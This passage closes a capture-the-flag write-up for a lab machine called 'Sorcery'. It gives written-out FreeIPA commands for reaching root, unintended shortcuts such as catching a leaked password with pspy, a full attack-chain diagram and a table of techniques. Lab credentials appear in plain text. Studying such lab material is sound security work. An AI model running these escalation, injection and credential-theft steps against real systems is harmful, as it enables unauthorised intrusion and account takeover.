┌──(sn0x㉿sn0x)-[~/HTB/Sorcery]
└─$ ssh ash_winter@10.10.11.73
(ash_winter@sorcery.htb) Password:
Password expired. Change your password now.
(ash_winter@sorcery.htb) New password:
ash_winter@main:~$
```

## Escalate to Root via Sudo Rule Management

`ash_winter` has the `add_sysadmin` role  meaning it can add members to the `sysadmins` group. That group has the `manage_sudorules_ldap` role, which lets it modify sudo rules in IPA.

#### Add `ash_winter` to `sysadmins`:

```
ash_winter@main:~$ ipa group-add-member sysadmins --users=ash_winter
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
```

#### Add `ash_winter` to the `allow_sudo` sudo rule:

```
ash_winter@main:~$ ipa sudorule-show allow_sudo
  Command category: all   # runs ANY command
  RunAs User category: all  # as ANY user

ash_winter@main:~$ ipa sudorule-add-user allow_sudo --users=ash_winter
  Users: admin, ash_winter
```

The `allow_sudo` rule runs any command as any user. Adding yourself to it gives you full root sudo.

#### Changes don't take effect until SSSD refreshes. `ash_winter` already has permission to restart it:

```
ash_winter@main:~$ sudo systemctl restart sssd
```

#### Check sudo:

```
ash_winter@main:~$ sudo -l
(ALL : ALL) ALL
```

#### Root:

```
ash_winter@main:~$ sudo su -
root@main:~# cat root.txt
```

***

## Unintended Paths

## Shortcut 1: Skip XSS, Just Overwrite Admin Password

As shown in the Cypher injection section  you can stack a `SET` query to overwrite the admin's Argon2 hash. This bypasses the whole Seller → XSS → passkey registration chain. You'll still need a passkey to use admin features, but you can enroll one yourself via the Chrome WebAuthn emulator once you're logged in as admin.

## Shortcut 2: PSpy Catches the Cleanup Script

There's a cron running every 10 minutes as the IPA admin user. It resets `ash_winter`'s password back to a known value. If you're watching with pspy:

```
CMD: UID=1638400000 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
```

This leaks `ash_winter`'s password directly. Combined with `ash_winter`'s `add_sysadmin` role, you can skip straight from `tom_summers` to root  bypassing the Xvfb/mousepad step, the Docker Registry, and `donna_adams` entirely.

**Why did this work as an unintended path?** The cleanup script was passing the password as a command-line argument, which shows up in `/proc/<pid>/cmdline` and gets captured by pspy's process monitoring. This was patched before retirement by reading the password from a file instead.

***

### Full Attack Chain

```
sorcery.htb (HTTPS/443)
        |
        | register account, browse products
        v
Cypher Injection (/dashboard/store/<id>)
        |-- leak registration key from Config node
        |-- (alt) overwrite admin password hash via SET
        v
Register as Seller (with registration key)
        |
        v
XSS in product description (dangerouslySetInnerHTML)
        |-- admin bot visits product with scoped JWT
        |-- XSS calls passkey registration server actions
        |-- Flask server generates ECDSA keypair + forged attestation
        |-- passkey registered on admin account
        v
Admin access + passkey session
        |-- Debug page: arbitrary TCP SSRF
        v
Craft Kafka Produce message → kafka:9092 → update topic
        |
        v
RCE in DNS container (bash -c on message body)
        |
        v
Enumerate network, download CA keypair from FTP (anonymous)
        |-- crack PKCS#8 key passphrase (hashcat 24420) → "password"
        |-- add DNS record for phishing.sorcery.htb
        |-- sign TLS cert with internal CA
        v
mitmproxy → phishing.sorcery.htb → proxy Gitea login
        |-- send email to tom_summers via MailHog (mail:1025)
        |-- bot clicks link, submits Gitea credentials
        v
SSH as tom_summers (jNsMKQ6k2.XDMPu.)
        |
        v
Read Xvfb framebuffer /xorg/xvfb/Xvfb_screen0
        |-- mousepad showing passwords.txt
        |-- password: dWpuk7cesBjT-
        v
su/SSH as tom_summers_admin
        |
        v
strace docker-credential-docker-auth → leak rebecca_smith password
        |-- reverse .NET binary → OTP algorithm
        |-- DotNetRandom(minute/10 + uid).Next(100000,999999)
        v
Docker Registry auth (localhost:5000)
        |-- pull test-domain-workstation image layers
        |-- docker-entrypoint.sh → donna_adams:3FEVPCT_c3xDH
        v
SSH as donna_adams
        |
        v
FreeIPA enumeration
        |-- donna_adams role: change_userPassword_ash_winter_ldap
        |-- ldapmodify -Y GSSAPI → set ash_winter password
        v
SSH as ash_winter
        |
        v
ash_winter role: add_sysadmin
        |-- ipa group-add-member sysadmins --users=ash_winter
        |-- ipa sudorule-add-user allow_sudo --users=ash_winter
        |-- sudo systemctl restart sssd (existing sudo permission)
        v
sudo su - → ROOT
```

***

### Techniques I Used

| Technique                        | Where Used                                                       |
| -------------------------------- | ---------------------------------------------------------------- |
| Cypher Query Injection           | Neo4j query via unsanitized URL parameter in Rust macro          |
| Argon2 Hash Generation (Offline) | Creating replacement admin password hash                         |
| WebAuthn Passkey Forgery         | XSS + Python ECDSA to register passkey on admin account          |
| Next.js Server Action Abuse      | Calling server actions directly via `Next-Action` header         |
| SSRF via Debug Tool              | Reaching internal Docker network services                        |
| Kafka Wire Protocol Crafting     | Building raw binary Produce request for RCE                      |
| Command Injection via Kafka      | DNS container pipes Kafka messages to `bash -c`                  |
| Anonymous FTP                    | Downloading CA certificate and encrypted private key             |
| PKCS#8 Key Cracking              | hashcat mode 24420, password: `password`                         |
| mitmproxy Reverse Proxy          | Intercepting Gitea credentials via phishing subdomain            |
| Internal CA Cert Signing         | Bypassing bot's TLS trust check                                  |
| Xvfb Framebuffer Read            | Reading running GUI session from world-readable framebuffer file |
| strace Process Tracing           | Capturing credentials from docker-credential-docker-auth         |
| .NET Binary Reverse Engineering  | Recreating OTP algorithm from DotPeek decompilation              |
| .NET System.Random Cloning       | Porting Knuth subtractive RNG to Python for OTP prediction       |
| Docker Registry Enumeration      | Pulling image layers via unauthenticated Registry API            |
| Secrets in Docker Image Layers   | Credentials in `docker-entrypoint.sh` baked into image           |
| FreeIPA Role Abuse               | Using role permissions to change user passwords via LDAP         |
| LDAP Attribute Write (GSSAPI)    | Direct `ldapmodify` bypassing IPA API restrictions               |
| IPA Sudo Rule Modification       | Adding self to `allow_sudo` rule via `sysadmins` role chain      |
| SSSD Cache Refresh               | `sudo systemctl restart sssd` to apply new sudo rules            |

<figure><img src="../../../../.gitbook/assets/complete (1).gif" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>
